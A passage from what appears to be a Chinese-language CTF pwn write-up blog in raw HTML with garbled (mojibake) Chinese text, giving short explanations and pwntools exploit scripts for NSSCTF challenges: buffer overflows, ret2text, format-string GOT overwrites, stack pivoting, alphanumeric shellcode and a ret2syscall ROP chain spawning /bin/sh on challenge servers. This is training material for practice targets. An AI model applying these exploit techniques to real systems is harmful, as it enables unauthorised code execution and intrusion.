class=\"line\">bin_sh=0x4011CA</span><br><span class=\"line\">ret=0x40101a</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x108)+p64(ret)+p64(bin_sh)</span><br><span class=\"line\">io.sendafter(b&#x27;llenge\\n&#x27;,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022shop_pwn\"><a class=\"anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h5>\n<p>ida æŸ¥çœ‹ game å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªå‡½æ•°æ¥åˆ›å»ºå¤šçº¿ç¨‹ï¼Œä½†æ˜¯æœ‰ä¸ª bugï¼Œmoney æ˜¯å…¬å…±èµ„æºï¼Œè¿™ä¸ªçº¿ç¨‹åˆ›å»ºæ—¶å¦å¤–ä¸€ä¸ªçº¿ç¨‹ä¹Ÿåˆ›å»ºäº†ï¼Œå¦‚æœå¤ªå¿«ä¼šé€ æˆéƒ½åœ¨å–é‚£ä¸ª pen ç›´æ¥æ„é€ ä¸€ä¸ª</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &quot;3\\n0\\n3\\n0\\n2\\n1\\n1\\&quot;|nc node5.anna.nssctf.cn 28765</span><br></pre></td></tr></table></figure></p>\n<p>å³å¯æŸ¥çœ‹åˆ° flag</p>\n<h5 id=\"hdctf-2023keep-on\"><a class=\"anchor\" href=\"#hdctf-2023keep-on\">#</a> [HDCTF 2023]KEEP ON</h5>\n<p>è¿™ä¸ªé¢˜æ³¨æ„çš„å­—ç¬¦ä¸²æº¢å‡ºæ˜¯ä¸€ä¸ªç‚¹è¿˜èƒ½å¤Ÿåˆ©ç”¨æ ˆè¿ç§»æ¥è·å– shellï¼Œå­—ç¬¦ä¸²æº¢å‡ºçš„è¯æ˜¯åˆ©ç”¨ printf çš„æº¢å‡ºç‚¹æ˜¯ 6 ç„¶åä½¿ç”¨ fmtstr_payload æ¥è®© system_plt æ¥å’Œ printf_got è¿›è¡Œåˆ‡æ¢åœ¨åˆ©ç”¨åé¢é‚£ä¸ª read å…è®¸æº¢å‡º 8 ä¸ªå­—èŠ‚æ¥è¿”å›åˆ° vuln å»åœ¨å­—ç¬¦ä¸²æº¢å‡ºè¿™é‡Œè¾“å…¥ /bin/sh å³å¯å¾—åˆ° shell</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>ON</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">elf = ELF(&quot;./hdctf&quot;)</span><br><span class=\"line\">#p = process(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">p = remote(&quot;node4.anna.nssctf.cn&quot;,28307)</span><br><span class=\"line\">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class=\"line\">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload1 = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)</span><br><span class=\"line\">log.info(payload1)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,payload1)</span><br><span class=\"line\">vuln_addr = 0x40076F</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload2 =b&#x27;a&#x27;*(0x50+0x8) + p64(vuln_addr)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;on !\\n&#x27;,payload2)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,&quot;/bin/sh\\x00&quot;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>è¿˜èƒ½ä½¿ç”¨æ ˆè¿ç§»å¦‚:<br />\n ä½¿ç”¨å­—ç¬¦ä¸²æ³„éœ²æ¥å¾—åˆ° rbp æ ˆåº•ä½ç½®ï¼Œä½¿ç”¨ stack æŸ¥çœ‹ rbp æ˜¯å¤šå°‘åœ¨ä½¿ç”¨æº¢å‡ºæ»¡æ»¡è°ƒè¯•å¾—åˆ°ä¸º %16p å³å¯å¾—åˆ° rbpï¼Œåœ¨ s å¤„è¾“å…¥å­—ç¬¦åä½¿ç”¨ pwndbg çš„ search æŸ¥çœ‹ä½ç½®ï¼Œç„¶ååœ¨è®¡ç®—å’Œ s çš„å€¼ç›¸å·®å¤šå°‘ï¼Œä½¿ç”¨ pwndbg çš„ distance å³å¯è®¡ç®—å‡ºç›¸å·®é‡ä¸º 60,rbp å’Œ s ç›¸å·® 0x60 è¿˜æœ‰ 0x8 çš„è¿”å›åœ°å€ï¼Œå³å¯ç®—åˆ°éœ€è¦è¿ç§»çš„æ ˆåœ°å€ä¸ºå¤šå¤š qianyi_rbp-0x60-0x8, åœ¨ä½¿ç”¨å¸¸è§„çš„ rdi pop;ret æ¥å°† /bin/sh å‹å…¥ system å‡½æ•°ä¸­ï¼Œä½†æ˜¯ä¸­é—´éœ€è¦åŠ ä¸€ä¸ª qianyi_rbp-0x20 æ¥ç»´æŒæ ˆå¹³è¡¡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28526)</span><br><span class=\"line\">io.recvuntil(b&#x27;name: \\n&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">fmtpayload = b&#x27;%16$p&#x27;</span><br><span class=\"line\">io.send(fmtpayload)</span><br><span class=\"line\">io.recvuntil(b&#x27;hello,0x&#x27;)</span><br><span class=\"line\">old_rbp = int(io.recv(12), 16)</span><br><span class=\"line\">log.success(&#x27;RBP Addr: &#x27; + (hex(old_rbp)))</span><br><span class=\"line\">leave_ret = 0x4007F2</span><br><span class=\"line\">rdi = 0x4008D3</span><br><span class=\"line\">system = elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">Target_Addr = old_rbp - 0x60 - 0x08</span><br><span class=\"line\"># RDI will pop binsh addr as system&#x27;s arg</span><br><span class=\"line\"># Offset : 0x08</span><br><span class=\"line\">Payload = p64(rdi)</span><br><span class=\"line\"># Offset : 0x08 + 0x08</span><br><span class=\"line\">Payload += p64(Target_Addr + 0x8 + 0x18)</span><br><span class=\"line\"># Offset : 0x08 + 0x10</span><br><span class=\"line\">Payload += p64(system)</span><br><span class=\"line\"># Offset : 0x08 + 0x18</span><br><span class=\"line\">Payload += b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\"># Fill the Payload to 0x50.</span><br><span class=\"line\">Payload = Payload.ljust(0x50, b&#x27;\\x00&#x27;)</span><br><span class=\"line\"># The Leave Ret cmd&#x27;s ret addr.</span><br><span class=\"line\">Payload += p64(Target_Addr)</span><br><span class=\"line\"># The Leave Ret</span><br><span class=\"line\">Payload += p64(leave_ret)</span><br><span class=\"line\">log.info(Payload)</span><br><span class=\"line\">io.recvuntil(b&#x27;keep on !\\n&#x27;)</span><br><span class=\"line\">io.send(Payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-æ–°ç”Ÿèµ›shellcode\"><a class=\"anchor\" href=\"#swpuctf-2022-æ–°ç”Ÿèµ›shellcode\">#</a> [SWPUCTF 2022 æ–°ç”Ÿèµ›] shellcodeï¼Ÿ</h5>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbGNyYWZ0LXNqMnA2NDNhanQ4Y3V0MmFxaTNhYnRlZTQ3Y2d3NGN2aWE3MmNuMjRlLnNo\">è¿˜ä¸èƒ½è¾“å…¥æ¯”è¾ƒé•¿çš„æˆ‘ç”¨ shellcraft.sh</span> () ç”Ÿæˆä¸è¡Œ</p>\n<h5 id=\"nustctf-2022-æ–°ç”Ÿèµ›ezpwn\"><a class=\"anchor\" href=\"#nustctf-2022-æ–°ç”Ÿèµ›ezpwn\">#</a> [NUSTCTF 2022 æ–°ç”Ÿèµ›] ezPwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ä»€ä¹ˆåˆ¤æ–­ç›´æ¥ä¸ç®¡getsæº¢å‡ºåç›´æ¥è·³è½¬åˆ°systemåœ°å€å³å¯</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote()</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">payload=cyclic(0x12)+p64(elf.sym[&#x27;system&#x27;])</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2023-week1easy_overflow\"><a class=\"anchor\" href=\"#hgame-2023-week1easy_overflow\">#</a> [HGAME 2023 week1]easy_overflow</h5>\n<p>å¾ˆç®€å•çš„ä¸€ä¸ª ret2text ä½†æ˜¯æœ‰ä¸ªå‘ç‚¹å°±æ˜¯ close (1) è¿™ä¸ªç‚¹ä½ éœ€è¦è¿ä¸Šå»åä½¿ç”¨ exec 1&gt;&amp;0 æ¥æ‰“å¼€æ ‡å‡†è¾“å‡º</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28539)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x40101a)+p64(0x401176)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2022-åˆèµ›login_normal\"><a class=\"anchor\" href=\"#ciscn-2022-åˆèµ›login_normal\">#</a> [CISCN 2022 åˆèµ›] login_normal</h5>\n<p>è¿™ä¸ªé¢˜è€ƒç‚¹åœ¨äºä»£ç å®¡è®¡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.arch=&#x27;amd64&#x27;</span><br><span class=\"line\">io=remote(&quot;node4.anna.nssctf.cn&quot;,28823)</span><br><span class=\"line\">#io=process(&#x27;./login&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(&quot;=================&quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">payload = b&#x27;opt:1\\nmsg:ro0tt\\n&#x27;</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">#shellcode = shellcraft.sh()</span><br><span class=\"line\">shellcode=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span><br><span class=\"line\">payload = b&#x27;opt:2\\nmsg:&#x27;+shellcode+b&#x27;\\n&#x27;</span><br><span class=\"line\">io.recvuntil(&quot;&gt;&gt;&gt; &quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-æ–°ç”Ÿèµ›darling\"><a class=\"anchor\" href=\"#swpuctf-2022-æ–°ç”Ÿèµ›darling\">#</a> [SWPUCTF 2022 æ–°ç”Ÿèµ›] Darling</h5>\n<p>éšæœºæ•° srand</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(0x1317E53)</span><br><span class=\"line\">sl=libc.rand()%100-64</span><br><span class=\"line\">p.sendline(str(sl))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"uuctf-2022-æ–°ç”Ÿèµ›babystack\"><a class=\"anchor\" href=\"#uuctf-2022-æ–°ç”Ÿèµ›babystack\">#</a> [UUCTF 2022 æ–°ç”Ÿèµ›] babystack</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28003)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x108+p64(0x0400591)+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019ä¸œå—pwn2\"><a class=\"anchor\" href=\"#ciscn-2019ä¸œå—pwn2\">#</a> [CISCN 2019 ä¸œå—] PWN2</h5>\n<p>è¿™ä¸ªé¢˜å¾ˆä¸é”™é€‚åˆæ–°æ‰‹åƒ 32 ä½çš„æ ˆåç§»</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">leave_ret=0x080485FD  </span><br><span class=\"line\">offset=0xffffcd58-0xffffcd20</span><br><span class=\"line\">io=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28203)</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># ç¬¬ä¸€æ¬¡æº¢å‡º1å­—èŠ‚è¦†ç›–\\x00ï¼Œæ³„éœ²ebp</span><br><span class=\"line\">io.sendafter(b&#x27;name?\\n&#x27;,b&#x27;a&#x27;*(0x28-1)+b&#x27;b&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;aaab&#x27;)</span><br><span class=\"line\">leak_ebp=u32(io.recvuntil(b&#x27;\\xff&#x27;))</span><br><span class=\"line\">success(hex(leak_ebp)) </span><br><span class=\"line\">target_addr=leak_ebp-offset-0x4 # -0x4æ˜¯å› ä¸ºç¬¬äºŒæ¬¡leave;retçš„æ—¶å€™ï¼Œpop espä¼šå¯¼è‡´+0x4</span><br><span class=\"line\"> # ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œropå†™åœ¨sä¸­ï¼Œæ ˆè¿ç§»åˆ°sï¼Œè°ƒç”¨systemï¼Œå‚æ•°ä¸ºè‡ªå·±å†™åœ¨æ ˆä¸Šçš„/bin/shï¼Œå‚æ•°åç§»è®¡ç®—å¯</span><br><span class=\"line\">payload=p32(elf.plt[&#x27;system&#x27;])+p32(elf.sym[&#x27;_start&#x27;])+p32(leak_ebp-offset+0xc)+b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\">payload=payload.ljust(0x28,b&#x27;a&#x27;)+p32(target_addr)+p32(leave_ret)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2023-åˆèµ›çƒ§çƒ¤æ‘Šå„¿\"><a class=\"anchor\" href=\"#ciscn-2023-åˆèµ›çƒ§çƒ¤æ‘Šå„¿\">#</a> [CISCN 2023 åˆèµ›] çƒ§çƒ¤æ‘Šå„¿</h5>\n<p>è¿™æ˜¯ä¸€ä¸ª 64 ä½çš„ ret2syscall æ³¨æ„ execve è°ƒç”¨ä½ 64 æ˜¯ 59ï¼Œæˆ–è€…å¯ä»¥ç›´æ¥ä½¿ç”¨ ropgadget çš„ ropchain æ¥ç›´æ¥ç”Ÿæˆ payload é¦–å…ˆå®¡è®¡æºç åˆ©ç”¨è´Ÿæ•°è¾¾åˆ°é‡‘é¢ç„¶ååœ¨åˆ©ç”¨æ”¹åé‡Œé¢çš„æº¢å‡ºè¾¾åˆ° shellï¼Œæ³¨æ„è¿™ä¸ªæ˜¯é™æ€</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from struct import pack</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28947)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(-10000))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(4))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(5))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p = b&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += b&#x27;/bin//sh&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # padding</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += 